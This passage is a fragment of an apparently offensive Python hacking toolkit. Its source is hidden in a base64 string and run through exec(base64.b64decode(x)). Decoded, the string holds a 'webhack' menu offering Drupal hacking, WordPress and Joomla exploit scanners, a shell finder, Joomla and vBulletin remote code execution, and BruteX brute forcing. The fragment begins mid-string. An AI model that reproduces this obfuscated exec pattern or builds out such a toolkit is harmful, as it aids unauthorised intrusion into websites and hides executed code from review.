AgIGVsc2U6DQogICAgICAgIG1lbnUoKQ0KDQoNCmRlZiB3ZWJoYWNrKCk6DQogICAgcHJpbnQoRlVDS0FETUlObG9nbykNCiAgICBwcmludCgiICAgezF9LS1EcnVwYWwgSGFja2luZyAiKQ0KICAgIHByaW50KCIgICB7Mn0tLUludXJsYnIiKQ0KICAgIHByaW50KCIgICB7M30tLVdvcmRwcmVzcyAmIEpvb21sYSBTY2FubmVyIikNCiAgICBwcmludCgiICAgezR9LS1HcmF2aXR5IEZvcm0gU2Nhbm5lciIpDQogICAgcHJpbnQoIiAgIHs1fS0tRmlsZSBVcGxvYWQgQ2hlY2tlciIpDQogICAgcHJpbnQoIiAgIHs2fS0tV29yZHByZXNzIEV4cGxvaXQgU2Nhbm5lciIpDQogICAgcHJpbnQoIiAgIHs3fS0tV29yZHByZXNzIFBsdWdpbnMgU2Nhbm5lciIpDQogICAgcHJpbnQoIiAgIHs4fS0tU2hlbGwgYW5kIERpcmVjdG9yeSBGaW5kZXIiKQ0KICAgIHByaW50KCIgICB7OX0tLUpvb21sYSEgMS41IC0gMy40LjUgcmVtb3RlIGNvZGUgZXhlY3V0aW9uIikNCiAgICBwcmludCgiICAgezEwfS1WYnVsbGV0aW4gNS5YIHJlbW90ZSBjb2RlIGV4ZWN1dGlvbiIpDQogICAgcHJpbnQoDQogICAgICAgICIgICB7MTF9LUJydXRlWCAtIEF1dG9tYXRpY2FsbA==''' )
exec (base64.b64decode(x))